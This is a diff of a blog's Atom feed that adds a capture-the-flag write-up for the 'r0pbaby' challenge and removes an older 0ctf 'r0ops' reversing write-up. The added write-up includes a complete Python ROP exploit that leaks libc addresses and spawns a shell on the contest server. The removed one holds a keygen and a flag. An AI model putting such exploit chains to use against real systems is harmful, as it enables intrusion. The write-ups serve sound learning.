@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-04-02T20:17:02+02:00</updated>
+  <updated>2015-05-29T23:40:00+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,139 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
+    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
+    <updated>2015-05-29T23:07:23+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
+    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>
+
+<!--more-->
+
+
+<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
+r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
+bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : ENABLED
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : disabled
+</code></pre>
+
+<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>
+
+<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>
+
+<pre><code class="python">import socket, struct, re, time
+
+def p(x):
+    return struct.pack('&lt;Q', x)
+
+def get_function(s, name):
+    s.send('2\n')
+    s.send(name+'\n')
+    time.sleep(0.50)
+    data = s.recv(1000)
+
+    m = re.findall('(0x0000.*)', data)
+    print m
+    return int(m[0], 16)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.connect(('localhost', 4000))
+s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))
+
+print s.recv(1000)
+print s.recv(1000)
+
+# get some address where we'll store the shellcode
+SYSTEM = get_function(s, "system")
+READ = get_function(s, "read")
+MPROTECT = get_function(s, "mprotect")
+
+# this offset was found like so:
+# $ nm -D ./libc-2.19.so |grep mprotect
+# 00000000000f4a20 W mprotect
+LIBC_BASE = MPROTECT - 0xf4a20
+
+print "[!] libc_base  = 0x%X" % LIBC_BASE
+print "[!] system()   = 0x%X" % SYSTEM
+print "[!] read()     = 0x%X" % READ
+print "[!] mprotect() = 0x%X" % MPROTECT
+
+POPRDX = LIBC_BASE + 0x000bcee0
+POPRAX = LIBC_BASE + 0x00048858
+POPRSI = LIBC_BASE + 0x00024805
+POPRDI = LIBC_BASE + 0x00022b1a
+SYSCAL = LIBC_BASE + 0x000c1e55
+MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret
+
+# kick off ROP chain
+s.send('3\n')
+print s.recv(1000)
+
+
+# build ROP chain
+# first, mprotect() a certain area
+payload = "A"*8
+payload += p(POPRDX)
+payload += p(7)
+payload += p(POPRSI)
+payload += p(0x1000)
+payload += p(POPRDI)
+payload += p(LIBC_BASE)
+payload += p(POPRAX)
+payload += p(10)
+payload += p(SYSCAL)
+
+# secondly, write '/bin' to memory via MOVMEM gadget
+payload += p(POPRDX)
+payload += p(0x6e69622f)
+payload += p(POPRAX)
+payload += p(LIBC_BASE)
+payload += p(MOVMEM)
+
+# thirdly, write '//sh' to memory
+payload += p(POPRDX)
+payload += p(0x68732f2f)
+payload += p(POPRAX)
+payload += p(LIBC_BASE+4)
+payload += p(MOVMEM)
+
+# finally, return-to-system and invoke a shell
+payload += p(POPRDI)
+payload += p(LIBC_BASE)
+payload += p(SYSTEM)
+
+length = "%d" % (len(payload)+1)
+print "[!] sending " + length + " bytes"
+s.send(length + '\n')
+
+time.sleep(0.5)
+s.send(payload + '\n')
+
+print s.recv(1000)
+
+# interact with the shell
+import telnetlib
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+s.close()
+</code></pre>
+
+<p>Putting it all together:</p>
+
+<p><img src="/assets/legitbs/r0pbaby.png" alt="" /></p>
+
+<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
@@ -309,276 +442,6 @@ for i in xrange(10, 30):
 <p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>
 
 <p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[0ctf - R0ops]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops/"/>
-    <updated>2015-03-30T21:15:09+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops</id>
-    <content type="html"><![CDATA[<p><code>r0ops</code> was a reversing challenge, worth only 150 points. Based on the amount of points, I expected it to be relatively easy, but I was in for a ride down the rabbit hole&hellip;</p>
-
-<!-- more -->
-
-
-<p></p>
-
-<p>The binary opens binds to a port and waits for incoming connections. Upon connecting with <code>nc</code>, nothing much happens. While trying to run it in <code>gdb</code>, I encountered the first anti-debugger trick:</p>
-
-<pre><code>;;; nice anti-debugger code
- dead448:   ba 00 00 00 00          mov    edx,0x0
- dead44d:   be 01 00 00 00          mov    esi,0x1
- dead452:   bf 02 00 00 00          mov    edi,0x2
- dead457:   e8 c4 32 55 f2          call   400720 &lt;socket@plt&gt;
- dead45c:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
- dead45f:   83 7d fc 03             cmp    DWORD PTR [rbp-0x4],0x3      ; anti-gdb trick
- dead463:   74 07                   je     dead46c &lt;div+0x320&gt;
- dead465:   b8 00 00 00 00          mov    eax,0x0
- dead46a:   eb 50                   jmp    dead4bc &lt;div+0x370&gt;
-</code></pre>
-
-<p><code>gdb</code> opens more file descriptors. The binary rightly expects the socket handle to be file descriptor 3; if it encounter anything else, it must be because <code>gdb</code> is running.</p>
-
-<p>Examing the output of <code>objdump</code>, I quickly learned that the main program is just a stub to load a ROP chain:</p>
-
-<pre><code> ;;; accept calls
- dead3af:   eb 02                   jmp    dead3b3 &lt;div+0x267&gt;
- dead3b1:   52                      push   rdx
- dead3b2:   f2 48 83 ec 10          repnz sub rsp,0x10
- dead3b7:   ba 00 00 00 00          mov    edx,0x0
- dead3bc:   be 00 00 00 00          mov    esi,0x0
- dead3c1:   bf 03 00 00 00          mov    edi,0x3
- dead3c6:   e8 45 33 55 f2          call   400710 &lt;accept@plt&gt;
- dead3cb:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
- dead3ce:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
- dead3d1:   b9 00 00 00 00          mov    ecx,0x0
- dead3d6:   ba 00 10 00 00          mov    edx,0x1000
- dead3db:   be c0 10 0b 0e          mov    esi,0xe0b10c0
- dead3e0:   89 c7                   mov    edi,eax
- dead3e2:   e8 89 32 55 f2          call   400670 &lt;recv@plt&gt;
- dead3e7:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
- dead3ea:   89 c7                   mov    edi,eax
- dead3ec:   b8 00 00 00 00          mov    eax,0x0
- dead3f1:   e8 ca 32 55 f2          call   4006c0 &lt;close@plt&gt;
- dead3f6:   ba a0 f0 0a 0e          mov    edx,0xe0af0a0
- dead3fb:   be a0 00 0b 0e          mov    esi,0xe0b00a0
- dead400:   b8 00 02 00 00          mov    eax,0x200
- dead405:   48 89 d7                mov    rdi,rdx
- dead408:   48 89 c1                mov    rcx,rax
- dead40b:   f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
- dead40e:   b8 c0 10 0b 0e          mov    eax,0xe0b10c0
- dead413:   48 89 c7                mov    rdi,rax                  ; input from socket
- dead416:   b8 c0 20 0b 0e          mov    eax,0xe0b20c0            ; storage
- dead41b:   48 89 c6                mov    rsi,rax
- dead41e:   b8 a0 f8 0a 0e          mov    eax,0xe0af8a0            ; contains a lot of addresses...
- dead423:   48 89 c4                mov    rsp,rax                  ; it's a ROP chain!
- dead426:   c3                      ret                             ; this generates a new program &amp; jumps to it
- dead427:   c9                      leave  
- dead428:   c3                      ret                             
-</code></pre>
-
-<p>I set a breakpoint at the <code>ret</code> instruction, just before the ROP chain kicks off. I then dumped and copied the ROP chain and used some shell-fu to clean up the output:</p>
-
-<pre><code class="bash">$ head stackdump 
-0xe0af8a0:  0x0dead1f4  0x00000000  0x00000008  0x00000000
-0xe0af8b0:  0x0dead271  0x00000000  0xbeef0095  0x1337dead
-0xe0af8c0:  0x0dead123  0x00000000  0x0dead0ed  0x00000000
-0xe0af8d0:  0x0dead204  0x00000000  0x0dead267  0x00000000
-0xe0af8e0:  0x0dead0f8  0x00000000  0x0dead103  0x00000000
-0xe0af8f0:  0x0dead0ed  0x00000000  0x0dead27a  0x00000000
-0xe0af900:  0x0dead20e  0x00000000  0x0dead0f8  0x00000000
-0xe0af910:  0x0dead1ec  0x00000000  0x0000cafe  0x00000000
-0xe0af920:  0x0dead141  0x00000000  0x0dead0ed  0x00000000
-0xe0af930:  0x0dead204  0x00000000  0x0dead284  0x00000000
-$ cat stackdump | sed 's/0x//g' | awk '{print $3 $2"\n" $5 $4}' &gt; ropchain
-</code></pre>
-
-<p>Now, the ropchain contained only bare addresses. This is were the second obfuscation step came into place: each ROP gadget starts with a <code>jmp</code> which jumps in the middle of another instruction. Because of this, the disassembly cannot be trusted. Instead, I manually looked up all the ROP gadgets and pieced them together. The ROP chain is quite ingenious, although it also contains tons of redundant instruction:</p>
-
-<pre><code>000000000dead1f4    pop rcx
-0000000000000008
-000000000dead271    pop r9                          ; r9 = 1337deadbeef0095
-1337deadbeef0095
-000000000dead123    mov    rax,QWORD PTR [rdi]      ; [rdi+0] first QWORD of input
-000000000dead0ed    add    rsi,0x8                  ; rsi=8
-000000000dead204    mov    QWORD PTR [rsi],rax      ; rsi=8
-000000000dead267    mov    r8,QWORD PTR [rsi]       ; rsi=8 r8 = first QWORD of input
-000000000dead0f8    sub    rsi,0x8                  ; rsi=0
-000000000dead103    add    rdi,0x8                  ; rdi=8
-000000000dead0ed    add    rsi,0x8                  ; rsi=8 (no-op)
-000000000dead27a    mov    QWORD PTR [rsi],r9       ; rsi=8 [rsi] = 1337deadbeef0095
-000000000dead20e    mov    rax,QWORD PTR [rsi]      ; rsi=8 rax = 1337deadbeef0095
-000000000dead0f8    sub    rsi,0x8                  ; rsi=0
-000000000dead1ec    pop    rbx                      ; rbx = cafe
-000000000000cafe
-000000000dead141    imul   rax,rbx                  ; rax ==&gt; 0x2724090c079825d6
-000000000dead0ed    add    rsi,0x8                  ; rsi=8
-000000000dead204    mov    QWORD PTR [rsi],rax      ; rax = 0x1337deadbeef0095*0xcafe
-...continues...
-</code></pre>
-
-<p>It basically takes the first QWORD of the input, sent over the socket, and then proceeds to generate a special constant. This is used later to compare against. I followed the rest of the ROP chain, and it basically does the following: it repeatedly multiplies the QWORD of our input with itself. At set intervals, it will multiply this value with the original QWORD. After a fixed number of iterations, it compares the resulting QWORD to the generated magic constant. The ROP chain uses a clever mechanism to implement conditional looping:</p>
-
-<pre><code>000000000dead1ec    pop    rbx                      ; rbx=0
-0000000000000000
-000000000dead1fc    pop    rdx                      ; rdx=1d8; adjustment for rsp!
-00000000000001d8                                    ; 
-000000000dead19b    0xdead19f:  cmp    rax,rbx      ; rax contains a counter used to iterate; 
-                    0xdead1a2:  jne    0xdead1a7    ; -&gt; ret; if rax != rbx, continue
-                    0xdead1a4:  add    rsp,rdx      ; when it reaches zero, control is passed to the next gadget, located at rsp+0x1d8 
-</code></pre>
-
-<p>Clever stuff, but horrible to trace. There were a lot of jumps and no ops to throw me off. For instance, a gadget would <code>add rsi, 8</code> and the next one would <code>sub rsi, 8</code>, effectively doing nothing (except annoying me and wearing out my Enter key).</p>
-
-<h2>Breaking the chain</h2>
-
-<p>The ROP chain repeats this process eight times, so we need to send eight QWORDS over the socket. For each QWORD, a new magic constant is generated (taking the former value, multiplying by <code>0xcafe</code> and adding <code>0xbeef</code>). To inspect what was going on, I set breakpoints on two very important ROP gadgets:</p>
-
-<pre><code>Breakpoint 1, 0x000000000dead145 in ?? ()
-1: x/i $rip
-=&gt; 0xdead145:   imul   rax,rbx
-
-
-Breakpoint 2, 0x000000000dead1ae in ?? ()
-1: x/i $rip
-=&gt; 0xdead1ae:   cmp    rax,rbx
-</code></pre>
-
-<p>This allowed me to dump each value that was generated, and finally see which values are being compared by the binary (one of which was the magic constant).</p>
-
-<p>I briefly considered bruteforcing the entire 64-bit range, but this was <em>way</em> too slow, even in C. I focussed on creating a function that emulates what is done with the first QWORD. After squashing a bug, I ended up with the following python code:</p>
-
-<pre><code class="python">def p(x, n):
-    while n:
-        x = (x*x) &amp; 0xffffffffffffffff
-        n -= 1
-    return x
-
-def c(i):
-    x = (p(i, 3) * i) &amp; 0xffffffffffffffff
-    x = (p(i, 4) * x) &amp; 0xffffffffffffffff
-    x = (p(i, 10) * x) &amp; 0xffffffffffffffff
-    x = (p(i, 12) * x) &amp; 0xffffffffffffffff
-    return (p(i, 13) * x) &amp; 0xffffffffffffffff
-
-print hex(c(0x4242424241414141)) # remember, little endian ;)
-</code></pre>
-
-<p>Then I noticed something crucial. As I entered variations of <code>0x4242424241414141</code>, the last byte of the generated value was only dependent on the last byte of the input (by chance it was also <code>0x41</code>)! This gave me an idea&hellip;</p>
-
-<h2>Byte-by-byte</h2>
-
-<p>I found I could bruteforce the correct value for each QWORD, going one byte at a time! After a while (and squashing the aforementioned bug by careful tracing of the ROP chain) I came up with the following python code:</p>
-
-<pre><code class="python">import struct
-
-def q(x):
-    return struct.pack('&lt;Q', x)
-
-def p(x, n):
-    while n:
-        x = (x*x) &amp; 0xffffffffffffffff
-        n -= 1
-    return x
-
-def c(i):
-    x = (p(i, 3) * i) &amp; 0xffffffffffffffff
-    x = (p(i, 4) * x) &amp; 0xffffffffffffffff
-    x = (p(i, 10) * x) &amp; 0xffffffffffffffff
-    x = (p(i, 12) * x) &amp; 0xffffffffffffffff
-    return (p(i, 13) * x) &amp; 0xffffffffffffffff
-
-
-key_list = []
-check = 0x1337deadbeef0095
-for u in range(8):
-    check = ((check * 0xcafe) + 0xbeef) &amp; 0xffffffffffffffff
-
-    key = 0
-    for i in range(8):
-        for z in xrange(1,0xff):
-            # ugly, but works: it basically only compares the output of the c() function
-            # up to the byte it's bruteforcing
-            if (c(key | (z &lt;&lt; (i*8))) &amp; (0xff &lt;&lt; i*8)) == (check &amp; (0xff &lt;&lt; i*8)):
-                key += (z &lt;&lt; (i * 8))
-                break
-
-    print "[+] key {}: {} -&gt; {} == {}".format(u, hex(key), hex(c(key)), hex(check))
-    key_list.append(key)
-
-# send all the generated keys as little-endian QWORDS to the binary
-from socket import *
-global s
-s=socket(AF_INET, SOCK_STREAM)
-s.connect(('localhost', 13337))
-
-payload = ''
-for key in key_list:
-    payload += q(key)
-
-s.send(payload+'\n')
-print s.recv(1000)
-
-s.close()
-</code></pre>
-
-<p>The ROP chain went through its hoops and landed here, dumping the flag!</p>
-
-<pre><code>000000000dead1aa    0xdead1ae:  cmp    rax,rbx
-                    0xdead1b1:  je     0xdead1b6  ; if rax == rbx, the special constant and the value generated from our QWORD match
-                    0xdead1b3:  add    rsp,rdx    ; if rax == rbx, this is skipped...
-                        0xdead1b6:  ret               ;
-000000000dead1fc    pop    rdx                    ; ...and the ROP chain continues here...
-fffffffffffffc38
-000000000dead1d7    loop   0xdead1db              ; ...if all eight QWORDS check out... (rcx contained 8 at the start)
-000000000dead33c
-   0xdead340:   sub    rsp,0x10                   ; ...then control is passed here
-   0xdead344:   mov    edi,0xdead544
-   0xdead349:   call   0x400680 &lt;puts@plt&gt;
-   0xdead34e:   mov    edi,0xdead54e
-   0xdead353:   mov    eax,0x0
-   0xdead358:   call   0x4006a0 &lt;printf@plt&gt;
-   0xdead35d:   mov    DWORD PTR [rbp-0x4],0x0
-   0xdead364:   jmp    0xdead38b
-   0xdead366:   mov    eax,DWORD PTR [rbp-0x4]
-   0xdead369:   cdqe   
-   0xdead36b:   mov    rax,QWORD PTR [rax*8+0xe0b10c0]
-   0xdead373:   mov    eax,eax
-   0xdead375:   mov    rsi,rax
-   0xdead378:   mov    edi,0xdead55d
-   0xdead37d:   mov    eax,0x0
-   0xdead382:   call   0x4006a0 &lt;printf@plt&gt;
-   0xdead387:   add    DWORD PTR [rbp-0x4],0x1
-   0xdead38b:   cmp    DWORD PTR [rbp-0x4],0x7
-   0xdead38f:   jle    0xdead366
-   0xdead391:   mov    edi,0xdead564
-   0xdead396:   call   0x400680 &lt;puts@plt&gt;            ; dumps flag in console!
-   0xdead39b:   mov    eax,0x0
-   0xdead3a0:   call   0xdead3af
-   0xdead3a5:   leave  
-   0xdead3a6:   ret
-</code></pre>
-
-<p>The output of the script and binary:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/0ctf/r0ops$ ./r0ops &amp; python ./bf.py
-[1] 4471
-[+] key 0: 0xd5b028b6c97155a5L -&gt; 0x2724090c0798e4c5L == 0x2724090c0798e4c5L
-[+] key 1: 0x51a2c3e8e288fa45 -&gt; 0x44e477ee2e372c65L == 0x44e477ee2e372c65L
-[+] key 2: 0x561720a3f926b105 -&gt; 0xa150eec963c67d25L == 0xa150eec963c67d25L
-[+] key 3: 0xa325ec548e4e0385L -&gt; 0xeab7d48b9db01ba5L == 0xeab7d48b9db01ba5L
-[+] key 4: 0x5369761ad6ccde85 -&gt; 0xf01b0cf36a8c5ea5L == 0xf01b0cf36a8c5ea5L
-[+] key 5: 0x9475802813002885L -&gt; 0x930eeb9679f4d8a5L == 0x930eeb9679f4d8a5L
-[+] key 6: 0xcadd6a0bdc679485L -&gt; 0xaeb27b8833e1e4a5L == 0xaeb27b8833e1e4a5L
-[+] key 7: 0x7d67b37124bcbc85 -&gt; 0x2a900a13b88bcca5L == 0x2a900a13b88bcca5L
-
-YOU WIN!
-
-FLAG IS: 0ctf{c97155a5e288fa45f926b1058e4e0385d6ccde8513002885dc67948524bcbc85}
-</code></pre>
-
-<p>Good stuff! Funny to see a ROP chain &ldquo;from the other side&rdquo; :)</p>
 ]]></content>
   </entry>
   
